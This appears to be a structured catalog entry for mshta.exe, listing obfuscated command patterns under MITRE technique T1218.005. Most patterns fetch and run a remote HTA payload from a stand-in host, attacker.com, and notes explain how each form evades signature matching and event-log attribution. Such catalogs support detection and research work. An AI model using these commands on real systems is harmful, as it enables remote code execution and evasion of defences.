---
Name: mshta
Description: "Microsoft HTML Application host. Executes HTA files or inline VBScript/JScript — commonly used for payload execution and initial access."
Platform: windows-cmd
BinaryPath:
  - C:\Windows\System32\mshta.exe
  - C:\Windows\SysWOW64\mshta.exe
Category: execution
MitreID: T1218.005
Patterns:
  - Pattern: "for /f %i in ('where mshta*') do %i http://attacker.com/payload.hta"
    Wildcards: ["*"]
    Notes: "Star matches '.exe'"
  - Pattern: "for /f %i in ('where m*ta.exe') do %i"
    Wildcards: ["*"]
    Notes: "Star replaces 'sh'"
  - Pattern: "for /f %i in ('where ms?ta.exe') do %i"
    Wildcards: ["?"]
    Notes: "Single char wildcard replaces 'h'"
  - Pattern: "for /f %i in ('dir /b C:\\Windows\\System32\\ms*ta.exe') do %i"
    Wildcards: ["*"]
    Notes: "dir glob search"
  - Pattern: "for %i in (C:\\Windows\\System32\\ms?ta.exe) do @%i http://attacker.com/payload.hta"
    Wildcards: ["?"]
    Notes: "Native CMD for loop with filesystem glob — ms?ta uniquely matches mshta.exe in System32"
    Method: "Simple for glob"
  - Pattern: "for /f %i in ('where /r C:\\Windows ms?ta.exe') do %i http://attacker.com/payload.hta"
    Wildcards: ["?"]
    Notes: "Recursive where search across Windows tree — finds mshta.exe in System32 and SysWOW64"
    Method: "where /r recursive"
  - Pattern: "forfiles /p C:\\Windows\\System32 /m ms?ta.exe /c \"@file http://attacker.com/payload.hta\""
    Wildcards: ["?"]
    Notes: "forfiles ? mask finds mshta.exe — @file expands to matched filename for execution"
  - Pattern: "cmd /v:on /c \"set x=mshta& !x! http://attacker.com/payload.hta\""
    Wildcards: []
    Notes: "Delayed variable expansion — /v:on enables !var! syntax; !x! resolves at runtime, evading parse-time static analysis"
    Method: "Delayed expansion"
  - Pattern: "cmd /c for /f %i in ('where m*ta.exe') do %i http://attacker.com/payload.hta"
    Wildcards: ["*"]
    Notes: "cmd /c wrapper adds an extra process layer — glob still resolves via where; parent process becomes cmd.exe not the caller"
    Method: "cmd /c indirection"
  - Pattern: "for /f %i in ('where mshta*') do start \"\" /b %i http://attacker.com/payload.hta"
    Wildcards: ["*"]
    Notes: "start /b launches mshta.exe as a detached background process — changes parent process attribution in event logs"
    Method: "start indirection"
PlatformNotes: |
  mshta.exe can run HTA files from local paths or URLs. Example: `mshta vbscript:Execute("CreateObject(""WScript.Shell"").Run ""cmd"":close")`. Blocked by many modern AV products but glob name obfuscation may bypass signature matching on process names.
Resources:
  - https://attack.mitre.org/techniques/T1218/005/
  - https://lolbas-project.github.io/lolbas/Binaries/Mshta/
---
